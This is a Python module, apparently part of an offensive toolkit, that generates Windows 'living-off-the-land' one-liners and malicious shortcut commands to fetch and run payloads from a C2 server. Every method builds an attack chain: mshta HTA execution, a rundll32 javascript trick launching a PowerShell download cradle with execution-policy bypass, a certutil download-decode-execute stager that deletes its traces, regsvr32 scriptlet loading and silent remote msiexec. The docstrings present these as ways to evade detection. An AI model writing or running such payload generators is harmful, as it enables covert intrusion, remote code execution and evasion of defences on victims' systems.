"""
lolbin_engine.py — Living-off-the-Land Binary Chain Generator

Generates command-line one-liners and LNK-compatible targets using Windows
native binaries (LOLBins) to stage and execute payloads without dropping
suspicious files.
"""

class LOLBinEngine:

    @staticmethod
    def mshta(url):
        """
        mshta http://c2/payload.hta
        Direct HTA execution via MSHTA (fileless). 
        Parent: explorer.exe or lnk handler.
        """
        return f'mshta {url}'

    @staticmethod
    def mshta_inline(payload_cmd):
        """
        mshta vbscript:Execute("...command...")
        Inline VBScript execution without touching disk.
        """
        escaped = payload_cmd.replace('"', '""')
        return f'mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""{escaped}"",0:close")'

    @staticmethod
    def rundll32_js(c2_url):
        """
        Classic rundll32 javascript: trick to download and exec a PowerShell stage.
        Whitelisted binary; no suspicious files on disk.
        """
        ps_one_liner = f'IEX(New-Object Net.WebClient).DownloadString("{c2_url}")'
        cmd = (
            f'rundll32 javascript:"\\..\\mshtml,RunHTMLApplication ";'
            f'document.write();'
            f'new%20ActiveXObject("WScript.Shell")'
            f'.Run("powershell -ep bypass -c {ps_one_liner}",0,true)'
        )
        return cmd

    @staticmethod
    def certutil_stager(c2_url, out_file='stage.ps1'):
        """
        certutil -urlcache -f c2url outfile
        Then decode (if base64) and execute.
        Certutil is a signed, whitelisted Windows binary.
        """
        b64_url = c2_url  # Assume the C2 serves a base64-encoded file
        decode_name = out_file + '.enc'
        chain = (
            f'cmd /c certutil -urlcache -f {b64_url} {decode_name} & '
            f'certutil -decode {decode_name} {out_file} & '
            f'powershell -ep bypass -f {out_file} & '
            f'del {decode_name} & del {out_file}'
        )
        return chain

    @staticmethod
    def regsvr32_scrobj(url):
        """
        regsvr32 /s /n /u /i:http://c2/payload.sct scrobj.dll
        COM scriptlet execution via regsvr32 (Squiblydoo).
        """
        return f'regsvr32 /s /n /u /i:{url} scrobj.dll'

    @staticmethod
    def msiexec_remote(url):
        """
        msiexec /q /i http://c2/payload.msi
        Remote MSI execution; msiexec is a signed Windows binary.
        """
        return f'msiexec /q /i {url}'

    @staticmethod
    def lnk_mshta_chain(c2_url, out_path='lnk_mshta.lnk', icon_path=None):
        """
        Generates a .lnk file that chains to mshta for fileless HTA staging.
        Requires lnk_handler to write the actual .lnk file.
        Returns (cmd_string, out_path) for use with LNKHandler.
        """
        cmd = LOLBinEngine.mshta(c2_url)
        return cmd, out_path

    @staticmethod
    def lnk_rundll32_chain(c2_url, out_path='lnk_rundll32.lnk'):
        """
        Generates a .lnk file that chains rundll32 JS download+exec.
        Returns (cmd_string, out_path).
        """
        cmd = LOLBinEngine.rundll32_js(c2_url)
        return cmd, out_path

    @staticmethod
    def lnk_certutil_chain(c2_url, out_path='lnk_certutil.lnk', stage_file='s.ps1'):
        """
        Generates a .lnk file that chains certutil download, decode, and execute.
        Returns (cmd_string, out_path).
        """
        cmd = LOLBinEngine.certutil_stager(c2_url, stage_file)
        return cmd, out_path

    @staticmethod
    def ps_download_exec(c2_url):
        """Simple PowerShell IEX download cradle."""
        return f'powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString(\'{c2_url}\')"'
